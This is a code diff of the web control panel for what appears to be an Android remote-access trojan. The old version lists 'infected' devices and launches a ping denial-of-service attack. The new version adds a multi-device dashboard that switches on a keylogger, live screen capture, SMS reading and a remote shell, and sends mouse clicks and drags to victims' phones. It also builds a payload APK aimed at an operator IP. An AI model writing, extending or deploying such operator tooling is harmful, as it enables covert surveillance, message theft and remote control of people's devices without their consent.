@@ -1,289 +1,763 @@
-const infected = document.getElementById("infected")
-const infos = document.getElementById("infos")
-const form = document.getElementById("left")
-const img = document.getElementById("img")
-const msgs = document.getElementById("msgs")
-const androidScreen = document.getElementById("imgSrc")
-const downloadAPKInput = document.querySelector('#downloadAPK input')
-const downloadAPKBnt = document.querySelector('#downloadAPK img')
+// =========================================
+// MULTI-DEVICE DASHBOARD
+// =========================================
 
-let CurrentDevice = ""
-let CurrentAttack = ""
-pingStop.disabled = true
+// Global State
+const activeDevices = new Map(); // deviceId -> { elements, state }
+const connectedDevices = new Map(); // deviceId -> device info
+let socket = null;
 
+// DOM Elements
+const deviceList = document.getElementById('deviceList');
+const deviceCount = document.getElementById('deviceCount');
+const multiDeviceGrid = document.getElementById('multiDeviceGrid');
 
-document.querySelectorAll("form").forEach(e => {
-    e.addEventListener("submit", i => i.preventDefault())
-})
+// Initialize
+document.addEventListener('DOMContentLoaded', () => {
+    initSocket();
+    setupEventListeners();
+});
 
-/* Clearing */
-// form.reset()
-infos.innerHTML = '<div class="info">    <span>Country :</span>    <span>--</span></div><div class="info">    <span>ISP :</span>    <span>--</span></div><div class="info">    <span>IP :</span>    <span>--</span></div><div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div>'
+// =========================================
+// SOCKET CONNECTION
+// =========================================
 
-
-
-
-
-function stopAttack() {
-    // STOPING CURRENT ATTACK
-    if (CurrentAttack != "") {
-        msgSend(CurrentDevice, CurrentAttack, "stop")
-        ele = document.querySelector('input[name="attack"]:checked')
-        if (ele != null) {
-            ele.checked = false
-        }
-        CurrentAttack = ""
-
-        // console.log(CurrentAttack,ele)
-    }
-}
-
-function DOS(val) {
-    if (val) {
-        // START DOS (PING) ATTACK
-        if (!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "")) {
-            msgSend("id", "ping", "start", pingIp.value, pingPort.value, pingWait.value)
-            pingStop.disabled = false
-            pingStart.disabled = true
-        } else {
-            alert(42)
-        }
-    } else {
-        msgSend("id", "ping", "stop")
-        pingStop.disabled = true
-        pingStart.disabled = false
-    }
-}
-
-
-async function getInfo(id) {
-    await stopAttack()
-    if (id != "None") {
-        $.ajax({
-            url: document.location.origin + '/info',
-            method: 'POST',
-            type: 'POST',
-            data: {
-                id: id,
-            },
-            success: async (data) => {
-                // console.log(data)
-                await stopAttack()
-                CurrentDevice = id
-                tmp = ""
-                delete data['ID']
-                for (i in data) {
-                    tmp += `<div class="info">
-                    <span>${i} :</span>
-                    <span>${data[i]}</span>
-                </div>`
-                }
-                infos.innerHTML = tmp
-            }
-        })
-    } else {
-        CurrentDevice = ""
-        infos.innerHTML = '<div class="info">    <span>Country :</span>    <span>--</span></div><div class="info">    <span>ISP :</span>    <span>--</span></div><div class="info">    <span>IP :</span>    <span>--</span></div><div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div>'
-    }
-}
-
-
-/** Loging Particals */
-// Particles.init({
-//     selector: '#bgParticals',
-//     color : "#ffffff",
-//     connectParticles : true,
-//     maxParticles : 50
-// });
-/** Loging Particals */
-
-
-
-/** Making Socket Connections */
-const socket = io(`ws://${document.location.hostname}:4001/`, { transports: ['websocket'], upgrade: false })
-const output = document.getElementById("output")
-
-socket.on("logger", (data) => {
-    // console.log(data)
-    output.append(data + "\n")
-    output.scrollTo(0, output.scrollTopMax)
-})
-
-socket.on("img", (data) => {
-    img.src = "data:image/jpeg;charset=utf-8;base64," + data
-})
-
-socket.on("sms", (data) => {
-    // console.log(data)
-    output.append("----------------------------\n")
-    data.forEach(msg => {
-        output.append(`[ ${msg.address} ] : ${msg.body}\n`)
+function initSocket() {
+    socket = io(`ws://${document.location.hostname}:4001/`, {
+        transports: ['websocket'],
+        upgrade: false
     });
-    output.append("----------------------------\n")
-    output.scrollTo(0, output.scrollTopMax)
-})
 
-socket.on("info", (data) => {
-    // console.log(data)
-    infected.innerHTML = '<option data-display="Infected">None</option>'
-    data.forEach(i => {
-        infected.insertAdjacentHTML("beforeend", `<option value="${i.ID}">${i.Brand} (${i.Model})</option>`)
-    })
-    $("select").niceSelect("update")
-})
+    // Device list updates
+    socket.on("info", (devices) => {
+        updateDeviceList(devices);
+    });
 
+    // Device-specific data handlers
+    socket.on("logger", (payload) => {
+        const { deviceId, data } = payload;
+        const device = activeDevices.get(deviceId);
+        if (device && device.elements.output) {
+            device.elements.output.value += data + "\n";
+            device.elements.output.scrollTop = device.elements.output.scrollHeight;
+        }
+    });
 
-/** Making Socket Connections */
+    socket.on("img", (payload) => {
+        const { deviceId, imageData } = payload;
+        const device = activeDevices.get(deviceId);
+        if (device && device.elements.screenImg && imageData && imageData.length > 0) {
+            device.elements.screenImg.src = "data:image/jpeg;base64," + imageData;
+        }
+    });
 
+    socket.on("sms", (payload) => {
+        const { deviceId, data } = payload;
+        const device = activeDevices.get(deviceId);
+        if (device && device.elements.smsOutput) {
+            device.elements.smsOutput.value += "----------------------------\n";
+            data.forEach(msg => {
+                device.elements.smsOutput.value += `[ ${msg.address} ] : ${msg.body}\n`;
+            });
+            device.elements.smsOutput.value += "----------------------------\n";
+            device.elements.smsOutput.scrollTop = device.elements.smsOutput.scrollHeight;
+        }
+    });
 
+    socket.on("shellOut", (payload) => {
+        const { deviceId, output } = payload;
+        const device = activeDevices.get(deviceId);
+        if (device && device.elements.termOutput) {
+            device.elements.termOutput.innerText += output;
+            device.elements.termContainer.scrollTop = device.elements.termContainer.scrollHeight;
+        }
+    });
+}
 
-/** Functions */
-function msgSend(id, emit, ...args) {
+// =========================================
+// DEVICE LIST MANAGEMENT
+// =========================================
+
+function updateDeviceList(devices) {
+    connectedDevices.clear();
+
+    if (!devices || devices.length === 0) {
+        deviceList.innerHTML = '<div class="empty-state">No devices connected</div>';
+        deviceCount.textContent = '0 active';
+        return;
+    }
+
+    deviceList.innerHTML = '';
+    devices.forEach(device => {
+        connectedDevices.set(device.ID, device);
+
+        const isActive = activeDevices.has(device.ID);
+
+        const deviceItem = document.createElement('div');
+        deviceItem.className = `device-item ${isActive ? 'selected' : ''}`;
+        deviceItem.innerHTML = `
+            <input type="checkbox" class="device-checkbox" 
+                   data-device-id="${device.ID}" 
+                   ${isActive ? 'checked' : ''}>
+            <div class="device-info">
+                <div class="device-name">${device.Brand} ${device.Model}</div>
+                <div class="device-meta">${device.IP} • ${device.Country}</div>
+            </div>
+        `;
+
+        deviceItem.addEventListener('click', (e) => {
+            if (e.target.type !== 'checkbox') {
+                const checkbox = deviceItem.querySelector('.device-checkbox');
+                checkbox.checked = !checkbox.checked;
+                checkbox.dispatchEvent(new Event('change'));
+            }
+        });
+
+        const checkbox = deviceItem.querySelector('.device-checkbox');
+        checkbox.addEventListener('change', (e) => {
+            e.stopPropagation();
+            if (e.target.checked) {
+                addDevicePanel(device.ID);
+            } else {
+                removeDevicePanel(device.ID);
+            }
+        });
+
+        deviceList.appendChild(deviceItem);
+    });
+
+    deviceCount.textContent = `${devices.length} active`;
+}
+
+// =========================================
+// DEVICE PANEL MANAGEMENT
+// =========================================
+
+function addDevicePanel(deviceId) {
+    if (activeDevices.has(deviceId)) return;
+
+    const device = connectedDevices.get(deviceId);
+    if (!device) return;
+
+    // Remove empty state
+    const emptyState = multiDeviceGrid.querySelector('.empty-grid-state');
+    if (emptyState) emptyState.remove();
+
+    // Create panel
+    const panel = document.createElement('div');
+    panel.className = 'device-panel';
+    panel.dataset.deviceId = deviceId;
+
+    panel.innerHTML = `
+        <div class="device-panel-header">
+            <div class="device-panel-title">
+                <i class="icon">smartphone</i>
+                ${device.Brand} ${device.Model}
+            </div>
+            <div style="display: flex; align-items: center; gap: 1rem;">
+                <span class="status-indicator">ACTIVE</span>
+                <div class="panel-zoom-controls">
+                    <button class="zoom-btn zoom-in" title="Zoom In">
+                        <i class="material-icons">add</i>
+                    </button>
+                    <button class="zoom-btn zoom-fullscreen" title="Fullscreen">
+                        <i class="material-icons">crop_free</i>
+                    </button>
+                    <button class="zoom-btn zoom-out hidden" title="Zoom Out">
+                        <i class="material-icons">remove</i>
+                    </button>
+                </div>
+                <button class="device-panel-close" onclick="removeDevicePanel('${deviceId}')">
+                    <i class="material-icons">close</i>
+                </button>
+            </div>
+        </div>
+        <div class="device-panel-body">
+            <div class="device-panel-controls">
+                <div class="device-toggles">
+                    <label class="toggle-wrapper">
+                        <input type="checkbox" value="logger" data-device-id="${deviceId}">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-label">Keylogger</span>
+                    </label>
+                    <label class="toggle-wrapper">
+                        <input type="checkbox" value="screen" data-device-id="${deviceId}">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-label">Screen</span>
+                    </label>
+                    <label class="toggle-wrapper">
+                        <input type="checkbox" value="sms" data-device-id="${deviceId}">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-label">SMS</span>
+                    </label>
+                    <label class="toggle-wrapper">
+                        <input type="checkbox" value="shell" data-device-id="${deviceId}">
+                        <span class="toggle-slider"></span>
+                        <span class="toggle-label">Shell</span>
+                    </label>
+                </div>
+            </div>
+            
+            <!-- Multi-View Container: All views visible simultaneously -->
+            <div class="device-multi-view layout-quad">
+                <!-- Screen View Panel -->
+                <div class="view-panel">
+                    <div class="view-panel-header">
+                        <div style="display: flex; align-items: center; gap: 0.5rem;">
+                            <i class="icon">screen_share</i>
+                            <span>Screen Feed</span>
+                        </div>
+                        <button class="image-zoom-btn maximize-view" title="Maximize" data-view="screen">
+                            <i class="material-icons">fullscreen</i>
+                        </button>
+                    </div>
+                    <div class="view-panel-body screen-view">
+                        <img draggable="false" alt="Screen Feed" style="max-width: 100%; max-height: 100%; object-fit: contain; cursor: none;">
+                    </div>
+                </div>
+                
+                <!-- Terminal View Panel -->
+                <div class="view-panel">
+                    <div class="view-panel-header">
+                        <i class="icon">terminal</i>
+                        Shell Access
+                    </div>
+                    <div class="view-panel-body terminal-view" style="display: flex; flex-direction: column;">
+                        <div class="term-output" style="flex: 1; overflow-y: auto; padding: 0.75rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--text-primary);"></div>
+                        <div class="term-input-line" style="display: flex; align-items: center; padding: 0.5rem; background: var(--bg-input); border-top: 1px solid var(--border-color);">
+                            <span class="prompt" style="color: var(--brand-primary); margin-right: 0.5rem;">➜</span>
+                            <input type="text" autocomplete="off" spellcheck="false" placeholder="Enter command..." style="flex: 1; background: transparent; border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; outline: none;">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Logger Output Panel -->
+                <div class="view-panel">
+                    <div class="view-panel-header">
+                        <i class="icon">article</i>
+                        Logger Output
+                    </div>
+                    <div class="view-panel-body">
+                        <textarea class="device-output" readonly spellcheck="false" style="width: 100%; height: 100%; background: var(--bg-app); border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 0.75rem; resize: none; outline: none;"></textarea>
+                    </div>
+                </div>
+                
+                <!-- SMS/Data Panel -->
+                <div class="view-panel">
+                    <div class="view-panel-header">
+                        <i class="icon">sms</i>
+                        SMS & Data
+                    </div>
+                    <div class="view-panel-body">
+                        <textarea class="device-sms" readonly spellcheck="false" style="width: 100%; height: 100%; background: var(--bg-app); border: none; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; padding: 0.75rem; resize: none; outline: none;"></textarea>
+                    </div>
+                </div>
+            </div>
+        </div>
+    `;
+
+    multiDeviceGrid.appendChild(panel);
+
+    // Store element references
+    const elements = {
+        panel,
+        output: panel.querySelector('.device-output'),
+        smsOutput: panel.querySelector('.device-sms'),
+        screenView: panel.querySelector('.screen-view'),
+        screenImg: panel.querySelector('.screen-view img'),
+        termContainer: panel.querySelector('.terminal-view'),
+        termOutput: panel.querySelector('.term-output'),
+        termInput: panel.querySelector('.terminal-view input')
+    };
+
+    activeDevices.set(deviceId, {
+        elements,
+        state: { currentView: 'output', activeFeatures: new Set() },
+        zoomCleanup: null
+    });
+
+    // Setup event listeners for this panel
+    setupPanelEventListeners(deviceId, elements);
+
+    // Setup zoom controls
+    const deviceState = activeDevices.get(deviceId);
+    deviceState.zoomCleanup = setupZoomControls(deviceId, panel);
+
+    // Setup view maximize/minimize
+    if (typeof setupViewMaximize === 'function') {
+        deviceState.viewMaximizeCleanup = setupViewMaximize(deviceId, panel);
+    }
+
+    // Update grid layout
+    updateGridLayout();
+
+    // Fetch device info
+    fetchDeviceInfo(deviceId);
+}
+
+function removeDevicePanel(deviceId) {
+    const device = activeDevices.get(deviceId);
+    if (!device) return;
+
+    // Stop all active features
+    device.state.activeFeatures.forEach(feature => {
+        sendCommand(deviceId, feature, 'stop');
+    });
+
+    // Cleanup zoom controls
+    if (device.zoomCleanup) {
+        device.zoomCleanup();
+    }
+
+    // Cleanup image zoom
+    if (device.imageZoomCleanup) {
+        device.imageZoomCleanup();
+    }
+
+    // Remove panel
+    device.elements.panel.remove();
+    activeDevices.delete(deviceId);
+
+    // Update checkbox
+    const checkbox = document.querySelector(`input[data-device-id="${deviceId}"]`);
+    if (checkbox) {
+        checkbox.checked = false;
+        checkbox.closest('.device-item')?.classList.remove('selected');
+    }
+
+    // Show empty state if no devices
+    if (activeDevices.size === 0) {
+        multiDeviceGrid.innerHTML = `
+            <div class="empty-grid-state">
+                <i class="material-icons">pan_tool</i>
+                <p>Select devices above to begin monitoring</p>
+            </div>
+        `;
+    }
+
+    updateGridLayout();
+}
+
+function updateGridLayout() {
+    const count = activeDevices.size;
+    multiDeviceGrid.className = 'multi-device-grid';
+    if (count === 2) multiDeviceGrid.classList.add('grid-2');
+    else if (count === 3) multiDeviceGrid.classList.add('grid-3');
+    else if (count >= 4) multiDeviceGrid.classList.add('grid-4');
+}
+
+// =========================================
+// PANEL EVENT LISTENERS
+// =========================================
+
+function setupPanelEventListeners(deviceId, elements) {
+    // Feature toggles
+    const toggles = elements.panel.querySelectorAll('.device-toggles input[type="checkbox"]');
+    toggles.forEach(toggle => {
+        toggle.addEventListener('change', (e) => {
+            const feature = e.target.value;
+            const action = e.target.checked ? 'start' : 'stop';
+            handleFeatureToggle(deviceId, feature, action, e.target.checked);
+        });
+    });
+
+    // Terminal input
+    if (elements.termInput) {
+        elements.termInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && e.target.value.trim()) {
+                sendShellCommand(deviceId, e.target.value.trim());
+                e.target.value = '';
+            }
+        });
+    }
+
+    // Mouse events for screen control
+    if (elements.screenImg) {
+        setupMouseControl(deviceId, elements.screenImg);
+    }
+}
+
+function handleFeatureToggle(deviceId, feature, action, isActive) {
+    const device = activeDevices.get(deviceId);
+    if (!device) return;
+
+    sendCommand(deviceId, feature, action);
+
+    if (isActive) {
+        device.state.activeFeatures.add(feature);
+    } else {
+        device.state.activeFeatures.delete(feature);
+    }
+
+    // All views are always visible in quad-panel layout
+    // No view switching needed - all functions can run simultaneously
+}
+
+// =========================================
+// MOUSE CONTROL
+// =========================================
+
+function setupMouseControl(deviceId, imgElement) {
+    let clickX1 = 0, clickY1 = 0;
+
+    imgElement.addEventListener('mouseup', (evt) => {
+        const rect = evt.target.getBoundingClientRect();
+        const visualWidth = rect.width;
+        const visualHeight = rect.height;
+        const naturalWidth = evt.target.naturalWidth;
+        const naturalHeight = evt.target.naturalHeight;
+
+        if (!naturalWidth || !naturalHeight) return;
+
+        const visualRatio = visualWidth / visualHeight;
+        const naturalRatio = naturalWidth / naturalHeight;
+
+        let renderedWidth, renderedHeight, offsetX, offsetY;
+
+        if (naturalRatio > visualRatio) {
+            renderedWidth = visualWidth;
+            renderedHeight = visualWidth / naturalRatio;
+            offsetX = 0;
+            offsetY = (visualHeight - renderedHeight) / 2;
+        } else {
+            renderedHeight = visualHeight;
+            renderedWidth = visualHeight * naturalRatio;
+            offsetX = (visualWidth - renderedWidth) / 2;
+            offsetY = 0;
+        }
+
+        const clickX = evt.clientX - rect.left - offsetX;
+        const clickY = evt.clientY - rect.top - offsetY;
+
+        let type, args;
+
+        if (Math.abs(evt.clientX - clickX1) < 5 && Math.abs(evt.clientY - clickY1) < 5) {
+            // Click
+            const xPct = clickX / renderedWidth;
+            const yPct = clickY / renderedHeight;
+
+            args = {
+                "x": xPct.toFixed(6),
+                "y": yPct.toFixed(6)
+            };
+            type = "click";
+        } else {
+            // Drag
+            const startRawX = clickX1 - rect.left - offsetX;
+            const startRawY = clickY1 - rect.top - offsetY;
+
+            const x1Pct = startRawX / renderedWidth;
+            const y1Pct = startRawY / renderedHeight;
+            const x2Pct = clickX / renderedWidth;
+            const y2Pct = clickY / renderedHeight;
+
+            args = {
+                "x1": x1Pct.toFixed(6),
+                "y1": y1Pct.toFixed(6),
+                "x2": x2Pct.toFixed(6),
+                "y2": y2Pct.toFixed(6)
+            };
+            type = "drag";
+        }
+
+        socket.emit("mouse", {
+            deviceId: deviceId,
+            type: type,
+            points: JSON.stringify(args)
+        });
+    });
+
+    imgElement.addEventListener('mousedown', (evt) => {
+        clickX1 = evt.clientX;
+        clickY1 = evt.clientY;
+    });
+}
+
+// =========================================
+// COMMANDS
+// =========================================
+
+function sendCommand(deviceId, feature, action, ...args) {
     $.ajax({
         url: document.location.origin + '/send',
         method: 'POST',
-        type: 'POST',
         data: {
-            emit: emit,
-            id: id,
-            args: JSON.stringify(args)
-        },
-        success: (data) => {
-            console.log(data)
+            id: deviceId,
+            emit: feature,
+            args: JSON.stringify([action, ...args])
         }
-    })
+    });
 }
 
-// Function for selecting only one check box in a group
-$('input[type="checkbox"]').on('change', async function () {
-    if (this.checked) {
-        $('input[name="' + this.name + '"]').not(this).prop('checked', false);
-    }
+function sendShellCommand(deviceId, command) {
+    $.ajax({
+        url: document.location.origin + '/send',
+        method: 'POST',
+        data: {
+            id: deviceId,
+            emit: 'shellCmd',
+            args: JSON.stringify([command])
+        }
+    });
+}
 
-    console.log(this)
-    if (CurrentAttack == "screen") {
-        androidScreen.style.opacity = "0"
-        androidScreen.style.pointerEvents = "none"
-        rightBG.style.opacity = "1"
-        output.style.opacity = "1"
-    }
+function fetchDeviceInfo(deviceId) {
+    $.ajax({
+        url: document.location.origin + '/info',
+        method: 'POST',
+        data: { id: deviceId }
+    });
+}
 
-    await stopAttack()
+// =========================================
+// UTILITY FUNCTIONS
+// =========================================
 
+function setupEventListeners() {
+    // Download APK
+    window.download = function () {
+        const input = document.querySelector('#downloadAPK input');
+        const ip = input.value.trim();
+        if (!ip) {
+            alert('Please enter IP address');
+            return;
+        }
+        window.location.href = `/apk?ip=${ip}`;
+    };
+}
 
-    CurrentAttack = this.value
-
-    if (this.checked && CurrentAttack == "screen") {
-        androidScreen.style.opacity = "1"
-        androidScreen.style.pointerEvents = "all"
-        rightBG.style.opacity = "0"
-        output.style.opacity = "0"
-    }
-
-
-    // console.log(CurrentDevice,this.value,"start")
-    if (this.checked) {
-        msgSend(CurrentDevice, this.value, "start")
-    } else {
-        CurrentAttack = ""
-    }
-
+// Add hidden class utility
+document.addEventListener('DOMContentLoaded', () => {
+    const style = document.createElement('style');
+    style.textContent = '.hidden { display: none !important; }';
+    document.head.appendChild(style);
 });
-// androidScreen.style.opacity = "1"
-// androidScreen.style.pointerEvents = "all"
-// rightBG.style.opacity = "0"
-// output.style.opacity = "0"
 
-/* Debug info *
-const  txt  = document.getElementById("txt")
-function update(x,y) {
-    txt.innerHTML = `x : ${x}<Br>y : ${y}`  
-}
-img.addEventListener("mousemove",(evt)=>{
-    // console.log(evt)
-    x = ((evt.clientX - evt.target.getBoundingClientRect().x)/evt.target.width)*100
-    y = ((evt.clientY - evt.target.getBoundingClientRect().y)/evt.target.height)*100
-    update(x,y)
-})
-/* Debug info */
+// =========================================
+// ZOOM FUNCTIONALITY
+// =========================================
 
+function setupZoomControls(deviceId, panel) {
+    const zoomIn = panel.querySelector('.zoom-in');
+    const zoomFullscreen = panel.querySelector('.zoom-fullscreen');
+    const zoomOut = panel.querySelector('.zoom-out');
 
-img.addEventListener("mousedown", (evt) => {
-    clickX1 = evt.clientX
-    clickY1 = evt.clientY
-})
-img.addEventListener("mouseup", (evt) => {
-    var type = ""
-    if (evt.clientX == clickX1 && evt.clientY == clickY1) {
-        x1 = ((evt.clientX - evt.target.getBoundingClientRect().x) / evt.target.width) * evt.target.naturalWidth
-        y1 = ((evt.clientY - evt.target.getBoundingClientRect().y) / evt.target.height) * evt.target.naturalHeight
+    let zoomState = 'normal'; // normal, zoomed, fullscreen
+    let overlay = null;
 
-
-        args = {
-            "x": x1.toFixed(4),
-            "y": y1.toFixed(4)
-        }
-        type = "click"
-        console.log("click", args)
-    } else {
-        x1 = ((clickX1 - evt.target.getBoundingClientRect().x) / evt.target.width) * evt.target.naturalWidth
-        y1 = ((clickY1 - evt.target.getBoundingClientRect().y) / evt.target.height) * evt.target.naturalHeight
-        x2 = ((evt.clientX - evt.target.getBoundingClientRect().x) / evt.target.width) * evt.target.naturalWidth
-        y2 = ((evt.clientY - evt.target.getBoundingClientRect().y) / evt.target.height) * evt.target.naturalHeight
-        args = {
-            "x1": x1.toFixed(4),
-            "y1": y1.toFixed(4),
-            "x2": x2.toFixed(4),
-            "y2": y2.toFixed(4)
-        }
-        type = "drag"
-        console.log("drag", args)
+    function createOverlay() {
+        overlay = document.createElement('div');
+        overlay.className = 'zoom-overlay';
+        overlay.addEventListener('click', () => resetZoom());
+        document.body.appendChild(overlay);
     }
-    socket.emit("mouse", {
-        type: type,
-        points: JSON.stringify(args)
-    })
-})
 
-const cursor = document.getElementById("cursor")
-document.addEventListener("mousemove", (evt) => {
-    cursor.style.top = evt.clientY + "px"
-    cursor.style.left = evt.clientX + "px"
-})
+    function removeOverlay() {
+        if (overlay) {
+            overlay.remove();
+            overlay = null;
+        }
+    }
 
-function download() {
-    var data = downloadAPKInput.value.trim()
-    try {
-        if (data.length) {
-            var [m_ip, m_port] = data.split(':')
-            if (!m_port) m_port = 4000
-            console.log()
-            $.ajax({
-                url: `/setup/${m_ip}/${m_port}`,
-                success: (data) => {
-                    var a = document.createElement('a')
-                    a.href = '/apk'
-                    a.click()
+    function resetZoom() {
+        panel.classList.remove('zoomed', 'fullscreen');
+        zoomIn.classList.remove('hidden');
+        zoomFullscreen.classList.remove('hidden');
+        zoomOut.classList.add('hidden');
+        removeOverlay();
+        zoomState = 'normal';
+    }
+
+    zoomIn.addEventListener('click', () => {
+        if (zoomState === 'normal') {
+            panel.classList.add('zoomed');
+            zoomIn.classList.add('hidden');
+            zoomFullscreen.classList.remove('hidden');
+            zoomOut.classList.remove('hidden');
+            createOverlay();
+            zoomState = 'zoomed';
+        }
+    });
+
+    zoomFullscreen.addEventListener('click', () => {
+        if (zoomState === 'normal') {
+            panel.classList.add('fullscreen');
+            zoomIn.classList.add('hidden');
+            zoomFullscreen.classList.add('hidden');
+            zoomOut.classList.remove('hidden');
+            createOverlay();
+            zoomState = 'fullscreen';
+        } else if (zoomState === 'zoomed') {
+            panel.classList.remove('zoomed');
+            panel.classList.add('fullscreen');
+            zoomFullscreen.classList.add('hidden');
+            zoomState = 'fullscreen';
+        }
+    });
+
+    zoomOut.addEventListener('click', () => {
+        resetZoom();
+    });
+
+    // ESC key to exit zoom
+    const escHandler = (e) => {
+        if (e.key === 'Escape' && zoomState !== 'normal') {
+            resetZoom();
+        }
+    };
+
+    document.addEventListener('keydown', escHandler);
+
+    // Store cleanup function
+    return () => {
+        document.removeEventListener('keydown', escHandler);
+        removeOverlay();
+    };
+}
+
+// =========================================
+// IMAGE ZOOM FUNCTIONALITY (Screen Feed)
+// =========================================
+
+function setupImageZoom(deviceId, screenView, screenImg) {
+    const zoomInBtn = screenView.querySelector('.zoom-in-img');
+    const zoomOutBtn = screenView.querySelector('.zoom-out-img');
+    const zoomResetBtn = screenView.querySelector('.zoom-reset-img');
+    const zoomDisplay = screenView.querySelector('.zoom-level-display');
+
+    let zoomLevel = 1.0; // 100%
+    const zoomStep = 0.1; // 10% per step
+    const minZoom = 0.5; // 50%
+    const maxZoom = 3.0; // 300%
+
+    function updateZoom(newZoom) {
+        zoomLevel = Math.max(minZoom, Math.min(maxZoom, newZoom));
+        screenImg.style.transform = `scale(${zoomLevel})`;
+        zoomDisplay.textContent = `${Math.round(zoomLevel * 100)}%`;
+    }
+
+    function zoomIn() {
+        updateZoom(zoomLevel + zoomStep);
+    }
+
+    function zoomOut() {
+        updateZoom(zoomLevel - zoomStep);
+    }
+
+    function resetZoom() {
+        updateZoom(1.0);
+    }
+
+    // Button handlers
+    zoomInBtn.addEventListener('click', zoomIn);
+    zoomOutBtn.addEventListener('click', zoomOut);
+    zoomResetBtn.addEventListener('click', resetZoom);
+
+    // Keyboard shortcuts (Ctrl+/Ctrl-/Ctrl0)
+    const keyHandler = (e) => {
+        if (e.ctrlKey || e.metaKey) {
+            if (e.key === '=' || e.key === '+') {
+                e.preventDefault();
+                zoomIn();
+            } else if (e.key === '-' || e.key === '_') {
+                e.preventDefault();
+                zoomOut();
+            } else if (e.key === '0') {
+                e.preventDefault();
+                resetZoom();
+            }
+        }
+    };
+
+    // Mouse wheel zoom (Ctrl + scroll)
+    const wheelHandler = (e) => {
+        if (e.ctrlKey || e.metaKey) {
+            e.preventDefault();
+            if (e.deltaY < 0) {
+                zoomIn();
+            } else {
+                zoomOut();
+            }
+        }
+    };
+
+    screenView.addEventListener('wheel', wheelHandler, { passive: false });
+    document.addEventListener('keydown', keyHandler);
+
+    // Cleanup function
+    return () => {
+        document.removeEventListener('keydown', keyHandler);
+        screenView.removeEventListener('wheel', wheelHandler);
+    };
+}
+
+// =========================================
+// VIEW PANEL MAXIMIZE/MINIMIZE
+// =========================================
+
+function setupViewMaximize(deviceId, panel) {
+    const maximizeBtns = panel.querySelectorAll('.maximize-view');
+    let maximizedView = null;
+    let overlay = null;
+
+    function createOverlay() {
+        overlay = document.createElement('div');
+        overlay.className = 'zoom-overlay';
+        overlay.addEventListener('click', minimizeView);
+        document.body.appendChild(overlay);
+    }
+
+    function removeOverlay() {
+        if (overlay) {
+            overlay.remove();
+            overlay = null;
+        }
+    }
+
+    function minimizeView() {
+        if (maximizedView) {
+            maximizedView.classList.remove('maximized');
+            const btn = maximizedView.querySelector('.maximize-view');
+            btn.innerHTML = '<i class="material-icons">fullscreen</i>';
+            btn.title = 'Maximize';
+            maximizedView = null;
+            removeOverlay();
+        }
+    }
+
+    maximizeBtns.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const viewPanel = btn.closest('.view-panel');
+
+            if (viewPanel.classList.contains('maximized')) {
+                // Minimize
+                minimizeView();
+            } else {
+                // Maximize
+                if (maximizedView) {
+                    minimizeView();
                 }
-            })
-        } else {
-            showMsg('Invalid Ip and Port. [ IP:PORT ]')
+                viewPanel.classList.add('maximized');
+                btn.innerHTML = '<i class="material-icons">fullscreen_exit</i>';
+                btn.title = 'Minimize';
+                maximizedView = viewPanel;
+                createOverlay();
+            }
+        });
+    });
+
+    // ESC key to minimize
+    const escHandler = (e) => {
+        if (e.key === 'Escape' && maximizedView) {
+            minimizeView();
         }
-    } catch (error) {
-        showMsg('Invalid Ip and Port. [ IP:PORT ]')
-    }
+    };
+
+    document.addEventListener('keydown', escHandler);
+
+    return () => {
+        document.removeEventListener('keydown', escHandler);
+        removeOverlay();
+    };
 }
-
-function showMsg(msg) {
-    var pTag = document.createElement("p")
-    pTag.className = "msg"
-    pTag.innerText = msg
-    msgs.insertAdjacentElement("beforeend", pTag)
-    setTimeout(() => pTag.remove(), 5000)
-}
-
-$(document).ready(() => {
-    $("select").niceSelect()
-})
-
-
